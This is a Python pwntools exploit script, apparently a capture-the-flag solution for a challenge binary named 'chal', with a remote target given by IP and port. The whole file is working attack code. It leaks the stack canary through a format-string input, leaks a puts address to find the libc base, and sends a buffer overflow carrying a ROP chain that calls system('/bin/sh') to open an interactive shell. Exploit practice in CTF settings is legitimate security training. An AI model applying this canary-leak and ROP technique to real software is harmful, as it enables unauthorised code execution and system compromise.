#!/usr/bin/env python3
from pwn import *

exe = context.binary = ELF(args.EXE or 'chal')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

context.terminal = ['wt.exe','wsl.exe']

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote('23.146.248.136',21101)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
continue
'''.format(**locals())


p = start()

p.sendline(b'8')
p.sendline(b'Y')
p.sendline('%35$p')
p.recvuntil(b'Here is your feedback for us: \n')
canary_addr = int(p.recvline(), 16)
log.info(f'Leak canary Address: {hex(canary_addr)}')

p.sendline(b'9')
p.recvuntil(b"Choose food:", timeout=3)
puts_leak = int(p.recvline().strip(), 16)
log.info(f"puts leak: {hex(puts_leak)}")

libc.address = puts_leak - libc.sym['puts']
log.info(f"libc base: {hex(libc.address)}")

rop2 = ROP(libc)
rop2.raw(rop2.ret.address)
rop2.system(next(libc.search(b'/bin/sh\00')))

payload = flat([
    b'A' * 200,
    canary_addr,
    b'B' * 8,
    # b'CCCCCC'
    rop2.chain()
    ])

for _ in range(5):
    p.sendline(b'1')  # Burger
    p.recvuntil(b"Choose food:", timeout=1)

p.sendline(payload)


p.interactive()

